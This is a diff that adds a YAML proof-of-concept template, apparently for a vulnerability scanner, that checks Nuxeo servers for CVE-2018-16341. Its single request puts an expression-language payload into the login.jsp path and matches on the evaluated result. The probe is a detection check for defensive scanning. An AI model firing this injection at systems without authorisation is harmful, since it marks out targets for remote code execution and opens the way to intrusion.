@@ -1,0 +1,18 @@
+id: poc-yaml-nuxeo-rce
+info:
+  name: Nuxeo RCE 漏洞利用
+  severity: high
+  tags:
+  - rce
+  - CVE-2018-16341
+  finger: Nuxeo
+  osprey-id: vb_2018_0052
+requests:
+- method: GET
+  path: /nuxeo/login.jsp/$%7B123*124%7D.xhtml
+  headers: {}
+  expression: 'contains(body, "15252.xhtml") && contains(body, "ERROR")
+
+    '
+variables: {}
+transport: http
